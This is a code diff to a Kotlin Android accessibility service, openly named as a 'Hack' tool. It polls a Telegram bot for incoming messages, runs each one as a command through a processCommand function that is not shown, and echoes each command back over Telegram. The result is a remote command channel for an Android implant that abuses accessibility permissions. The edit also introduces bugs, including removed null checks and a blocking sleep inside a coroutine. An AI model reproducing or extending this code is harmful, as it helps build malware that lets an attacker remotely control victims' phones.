@@ -13,13 +13,12 @@ class HackTelegramAccessibilityService : AccessibilityService() {
     private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
 
     companion object {
-        private const val TAG = "HackTelegramAccessibilityService"
+        private const val TAG = "HackTelegramService"
     }
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         Log.d(TAG, "accessibility service connected")
-
         serviceScope.launch {
             listenToTelegram()
         }
@@ -40,25 +39,26 @@ class HackTelegramAccessibilityService : AccessibilityService() {
 
     private suspend fun listenToTelegram() {
         val network = HackNetwork(applicationContext)
-        while (isActive) {
+        while (true) {
             try {
-                val updatesResponse = network.getUpdates(lastUpdateId)
+                val updatesResponse = network.getUpdates(lastUpdateId) // new messages
                 val updates = updatesResponse?.updates()
-                if (!updates.isNullOrEmpty()) {
+
+                if (updates != null) {
                     for (update in updates) {
-                        val message = update.message()?.text()
-                        message?.let {
-                            Log.d(TAG, "received: $it")
-                            network.sendTextMessage("new command: $it")
-                            processCommand(it)
-                            lastUpdateId = update.updateId() + 1
-                        }
+                        // message test
+                        val message = update.message().text()
+                        network.sendTextMessage("New message received: $message")
+                        Log.d(TAG, "New message received: $message")
+                        processCommand(message)
+                        lastUpdateId = update.updateId() + 1
                     }
                 }
             } catch (e: Exception) {
-                Log.e(TAG, "error: ${e.message}")
+                Log.d(TAG, e.toString())
             }
-            delay(5000)
+            // sleep
+            Thread.sleep(5000)  // every 5 sec
         }
     }
 
